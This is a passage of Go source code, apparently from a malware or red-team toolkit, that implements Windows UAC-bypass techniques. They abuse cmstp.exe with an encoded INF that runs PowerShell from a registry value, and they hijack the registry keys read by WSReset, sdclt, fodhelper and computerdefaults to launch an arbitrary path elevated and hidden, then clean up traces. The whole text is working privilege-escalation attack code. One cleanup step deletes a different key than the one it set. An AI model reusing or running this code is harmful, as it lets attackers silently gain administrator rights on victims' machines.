	var infTemplate = `W3ZlcnNpb25dDQpTaWduYXR1cmU9JGNoaWNhZ28kDQpBZHZhbmNlZElORj0yLjUNCg0KW0RlZmF1bHRJbnN0YWxsXQ0KQ3VzdG9tRGVzdGluYXRpb249Q3VzdEluc3REZXN0U2VjdGlvbkFsbFVzZXJzDQpSdW5QcmVTZXR1cENvbW1hbmRzPVJ1blByZVNldHVwQ29tbWFuZHNTZWN0aW9uDQoNCltSdW5QcmVTZXR1cENvbW1hbmRzU2VjdGlvbl0NCnBvd2Vyc2hlbGwgLWMgIklFWCgoR2V0LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAnSEtDVTpcQ29uc29sZScpLlgpIg0KdGFza2tpbGwgL0lNIGNtc3RwLmV4ZSAvRg0KDQpbQ3VzdEluc3REZXN0U2VjdGlvbkFsbFVzZXJzXQ0KNDkwMDAsNDkwMDE9QWxsVVNlcl9MRElEU2VjdGlvbiwgNw0KDQpbQWxsVVNlcl9MRElEU2VjdGlvbl0NCiJIS0xNIiwgIlNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXEFwcCBQYXRoc1xDTU1HUjMyLkVYRSIsICJQcm9maWxlSW5zdGFsbFBhdGgiLCAiJVVuZXhwZWN0ZWRFcnJvciUiLCAiIg0KDQpbU3RyaW5nc10NClNlcnZpY2VOYW1lPSJOZXR3b3JrIFNlcnZpY2UiDQpTaG9ydFN2Y05hbWU9Ik5ldHdvcmsgU2VydmljZSI=`
	_ = CreateFileAndWriteData(os.Getenv("APPDATA")+"//A.ini", []byte(Base64Decode(infTemplate)))
	time.Sleep(1 * time.Second)
	IssuePowershell("Start-Process \"C:\\Windows\\System32\\cmstp.exe\" /au " + os.Getenv("APPDATA") + "//A.ini" + " -WindowStyle Hidden")
	time.Sleep(3 * time.Second)
	os.Remove(os.Getenv("APPDATA") + "//A.ini")
	os.Exit(1)
}

func WSRESET(path string) { //17134 to 99999
	IssuePowershell("REG ADD HKCU\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command")
	_ = WriteRegistryKey(registry.CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\Open\\command", "DelegateExecute", "")
	time.Sleep(1 * time.Second)
	_ = WriteRegistryKey(registry.CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\Open\\command", "", "cmd /c start "+path)
	time.Sleep(1 * time.Second)
	//Wow64DisableWow64FsRedirection
	IssuePowershell("Start-Process \"C:\\Windows\\System32\\WSReset.exe\" -WindowStyle Hidden")
	time.Sleep(3 * time.Second)
	//Wow64RevertWow64FsRedirection
	IssuePowershell("REG DELETE  HKCU\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command /f ")
	os.Exit(1)
}

func SDCLT(path string) { //10240 to 16215
	IssuePowershell("REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe")
	_ = WriteRegistryKey(registry.CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe", "", "")
	_ = WriteRegistryKey(registry.CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe", "", "cmd /c start "+path)
	IssuePowershell("Start-Process \"C:\\Windows\\System32\\sdclt.exe\" -WindowStyle Hidden")
	time.Sleep(3 * time.Second)
	IssuePowershell("REG DELETE HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe /f ")
	os.Exit(1)
}

func FODHelper(path string) { //10240 to 99999
	IssuePowershell("REG ADD HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command")
	_ = WriteRegistryKey(registry.CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\Open\\command", "DelegateExecute", "")
	time.Sleep(1 * time.Second)
	_ = WriteRegistryKey(registry.CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\Open\\command", "", "cmd /c start "+path)
	time.Sleep(1 * time.Second)
	IssuePowershell("Start-Process \"C:\\Windows\\System32\\fodhelper.exe\" -WindowStyle Hidden")
	time.Sleep(3 * time.Second)
	IssuePowershell("REG DELETE HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /f ")
	os.Exit(1)
}

func ComputerDefaults(path string) { //10240 to 99999
	kernel32, _ := syscall.LoadLibrary("kernel32.dll")
	procWow64DisableWow64FsRedirection, _ := syscall.GetProcAddress(kernel32, "Wow64DisableWow64FsRedirection")
	_, _, _ = syscall.Syscall(procWow64DisableWow64FsRedirection, uintptr(1), uintptr(0), uintptr(0), uintptr(0))
	IssuePowershell("REG ADD HKCU\\Software\\Classes\\exefile\\shell\\open\\command")
	time.Sleep(1 * time.Second)
	_ = WriteRegistryKey(registry.CURRENT_USER, "Software\\Classes\\exefile\\shell\\open\\command", "", "cmd /c start "+path)
	time.Sleep(1 * time.Second)
	_ = WriteRegistryKey(registry.CURRENT_USER, "Software\\Classes\\exefile\\shell\\open\\command", "DelegateExecute", "")
	time.Sleep(1 * time.Second)
	IssuePowershell("start computerdefaults.exe")
	time.Sleep(3 * time.Second)
	IssuePowershell("REG DELETE HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /f ")
}
